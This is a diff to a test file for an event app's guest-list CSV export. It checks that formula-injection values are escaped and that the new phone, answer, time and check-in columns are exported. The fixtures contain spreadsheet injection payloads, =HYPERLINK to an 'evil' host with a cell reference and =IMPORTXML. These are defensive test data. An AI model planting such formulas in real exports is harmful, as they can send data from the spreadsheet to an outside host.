@@ -43,15 +43,20 @@ describe("SEC-16: CSV formula injection in guest export", () => {
 
   it("neutralizes a formula-injection guest name with a leading apostrophe", async () => {
     mockGetSession.mockResolvedValue({ userId: "host1", role: "HOST" });
-    mockEventFindUnique.mockResolvedValue({ id: "evt1", hostId: "host1", coHosts: [] });
+    mockEventFindUnique
+      .mockResolvedValueOnce({ id: "evt1", hostId: "host1", coHosts: [] })
+      .mockResolvedValueOnce({ timezone: "America/New_York", rsvpFields: [] });
     mockRsvpFindMany.mockResolvedValue([
       {
         guestName: `=HYPERLINK("http://evil/?"&A1)`,
         guestEmail: `+15551234567`,
+        guestPhone: null,
         status: "GOING",
         plusOneCount: 0,
         approved: true,
         createdAt: new Date("2026-06-27T00:00:00.000Z"),
+        answers: [],
+        checkIn: null,
       },
     ]);
 
@@ -66,5 +71,47 @@ describe("SEC-16: CSV formula injection in guest export", () => {
     expect(csv).toContain(`"'+15551234567"`);
     // A raw, unneutralized formula cell must NOT be present.
     expect(csv).not.toContain(`"=HYPERLINK`);
+  });
+
+  it("exports phone, ordered questionnaire answers, local times, check-in, and UTC references", async () => {
+    mockGetSession.mockResolvedValue({ userId: "host1", role: "HOST" });
+    mockEventFindUnique
+      .mockResolvedValueOnce({ id: "evt1", hostId: "host1", coHosts: [] })
+      .mockResolvedValueOnce({
+        timezone: "America/New_York",
+        rsvpFields: [
+          { id: "field-1", label: "Meal" },
+          { id: "field-2", label: "Meal" },
+        ],
+      });
+    mockRsvpFindMany.mockResolvedValue([
+      {
+        guestName: "Ada",
+        guestEmail: "ada@example.com",
+        guestPhone: "+15551234567",
+        status: "GOING",
+        plusOneCount: 2,
+        approved: true,
+        createdAt: new Date("2026-07-14T20:00:00.000Z"),
+        answers: [
+          { rsvpFieldId: "field-1", value: "Vegetarian" },
+          { rsvpFieldId: "field-2", value: '=IMPORTXML("https://evil")' },
+        ],
+        checkIn: { checkedInAt: new Date("2026-07-14T21:30:00.000Z") },
+      },
+    ]);
+
+    const response = await GET(new Request("http://localhost:3000/e/party/guests.csv"), {
+      params: Promise.resolve({ slug: "party" }),
+    });
+    const csv = await response.text();
+
+    expect(csv).toContain('"Phone"');
+    expect(csv).toContain('"Meal","Meal (2)"');
+    expect(csv).toContain('"2026-07-14 16:00:00"');
+    expect(csv).toContain('"2026-07-14 17:30:00"');
+    expect(csv).toContain('"2026-07-14T20:00:00.000Z","2026-07-14T21:30:00.000Z"');
+    expect(csv).toContain('"\'=IMPORTXML(""https://evil"")"');
+    expect(csv).toContain('"\'+15551234567"');
   });
 });
